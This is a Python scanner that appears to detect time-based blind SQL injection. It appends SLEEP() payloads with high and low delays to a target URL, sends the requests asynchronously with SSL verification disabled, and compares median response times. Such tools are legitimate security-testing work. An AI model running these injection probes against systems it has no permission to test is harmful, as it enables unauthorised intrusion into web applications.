import numpy as np
import asyncio
import timeit
from aiohttp import ClientSession
from aiohttp import TCPConnector
import re


async def get_url_rtt(url, session, i):
    '''
    Collects the request RTT of the "url" passed above and returns it along with and id "i"
    '''

    get_url_rtt.start_time[url+str(i)] = timeit.default_timer()
    async with session.get(url) as response:
        resp = await response.read()
        rtt = timeit.default_timer() - get_url_rtt.start_time[url+str(i)]
        return (i, rtt)

def analyze_rtts(rtts, diff):
    '''
    Analyses two sets of rtts and decides whether the difference shows a vulnerability or not
    Using dummy way of analyzing the rtts. will be replaced with more sophisticated method
    '''

    low_delay = []
    high_delay = []
    for rtt in rtts:
        if rtt[0] % 2 == 0:
            high_delay.append(rtt[1])
        else:
            low_delay.append(rtt[1])
    
    difference = np.median(high_delay) - np.median(low_delay)

    # If the the high and low rtts differ by more than 
    return int(difference >= diff)

async def scan_url(url, high, low, num_requests):
    '''
    Scans the "url" for "num_requests" times.
    Half of those requests have a sleep command with a "high" sleep delay
    The other half have a sleep command with a "low" sleep delay
    '''

    tasks = []
    con = TCPConnector(ssl=False)
    get_url_rtt.start_time = {}
    # Fetch all responses within one Client session, keep connection alive for all requests.
    async with ClientSession(connector=con) as session:
        for i in range(1, num_requests + 1):

            if i % 2 == 0: # Even Numberber gets Assigned High Delay
                task = asyncio.ensure_future(get_url_rtt(url + 'SLEEP({})'.format(high), session, i))
                tasks.append(task)

            else: # Odd Number gets Assigned Low Delay
                task = asyncio.ensure_future(get_url_rtt(url + 'SLEEP({})'.format(low), session, i))
                tasks.append(task)

        # All RTTs from responses are in this variable
        responses = await asyncio.gather(*tasks)

    return responses


def test(url, high = 0.8, low= 0.03, num_requests = 24, diff = 3):
    '''
    Returns whether a url is vulnerable (1) or safe (0)
    '''

    # Scan URL in async
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(scan_url(url, high, low, num_requests))
    loop.run_until_complete(future)

    return analyze_rtts(future.result(), diff)

